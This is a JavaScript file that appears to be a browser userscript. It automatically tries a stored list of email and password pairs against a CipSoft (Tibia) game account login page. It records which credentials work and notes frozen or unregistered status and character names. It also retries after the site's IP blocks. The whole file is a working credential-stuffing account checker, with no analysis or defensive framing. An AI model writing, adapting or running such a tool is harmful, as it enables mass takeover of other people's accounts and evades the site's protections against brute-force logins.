var page = document.documentElement.innerHTML;

function grab(begin, end)
{
  var x = page.indexOf(begin) + begin.length;
  return page.substring(x, page.indexOf(end, x));
}

function doLogin(loginForm, email, pswd)
{
  loginForm[0].value = email;
  loginForm[1].value = pswd;
  loginForm[3].click();  
}

function doLogout()
{
  var logoutBtn = document.getElementById('LoginstatusText_2');
  
  if (logoutBtn)
    logoutBtn.click();
}

function isLoginAttempt(index)
{
  if (page.indexOf('wrong password') > -1) {
	window.localStorage.setItem('last_index', index); // Valid attempt
    window.localStorage.setItem('log', ' [INVALID]\n');
  }
  else if (page.indexOf('Wrong account data') > -1)
    return false; // Not valid attempt (IP block), keep the current item
  
  return true;
}

function getAccountInfo()
{
  var accInfo = grab('class="BigBoldText">', '<') + ' - ';

  if (page.indexOf('<b>Your account has been frozen by CipSoft!</b>') > -1)
    accInfo += 'Frozen - ';

  if (page.indexOf('<b>Your account is not registered!</b>') > -1)
    accInfo += 'Unregistered - ';
  
  accInfo += getMainCharInfo();
  return accInfo;
}

function getMainCharInfo()
{
  var x = 0;
  var character = document.querySelectorAll('#CharacterNameOf_' + x.toString());
  
  while (character.length) {
    if (character[0].innerHTML.indexOf(' <img') > -1)
      return character[0].textContent + '- ' + character[1].textContent;

    x++;
    character = document.querySelectorAll('#CharacterNameOf_' + x.toString());
  }
  
  return '';
}

function isValidLogin()
{
  if (page.indexOf('Welcome to your account') == -1)
	return false;

  var log = ' [VALID - ' + getAccountInfo() + ']\n';

  window.localStorage.setItem('log', log);
  return true;
}

function addLogResult(list_array, curr_index)
{
  if (!curr_index)
    return;

  // Append the resulting message to the previous index
  var res = window.localStorage.getItem('results');
  var log = window.localStorage.getItem('log');
  var entry = list_array[curr_index-1];
  
  if (!res)
    res = '';

  if (log.length) {
    res += entry;
    res += log;
    window.localStorage.setItem('results', res);	
  }
}

// List containing the accounts
var list = window.localStorage.getItem('list');

if (list) {
  window.localStorage.setItem('log', '');
  
  // Separate each item in the list
  var list_array = list.split('\r\n');

  // Obtain the current list index and the index of the last
  // successfully checked item
  var curr_index = parseInt(window.localStorage.getItem('curr_index'), 10);
  var last_index = parseInt(window.localStorage.getItem('last_index'), 10);
  var stop_index = parseInt(window.localStorage.getItem('stop_index'), 10);
  
  // Check if the end of the index hasn't been reached
  if ((stop_index && curr_index < stop_index) || curr_index < list_array.length) {
    var loginForm = document.getElementById('LoginForm');
    var loginBtn = document.getElementsByClassName('MediumButtonText')[0];
	
    // Check if it is the login page
    if (loginForm) {
      // Separate the values of the current item
      var acc_array = list_array[curr_index].split(' | ');
      
      // Check the status of the previous item
      if (isLoginAttempt(curr_index)) {
		addLogResult(list_array, curr_index);
		
        // Go to the next item in the list
    	window.localStorage.setItem('curr_index', curr_index+1);	
		
        // Check if it is a valid account
        if (acc_array.length >= 2)
		  doLogin(loginForm, acc_array[0], acc_array[1]);  
      }
      else { // IP block
        // Restore the index of the last unsucessful attempt
        window.localStorage.setItem('curr_index', last_index);
        window.location.reload();
      }
    }
	else if(isValidLogin()) {
	  addLogResult(list_array, curr_index);
	  doLogout();
	}
	else if (loginBtn)
	  loginBtn.click();
  }
  else
    alert('List finished.');
}
else 
	alert('List missing.');
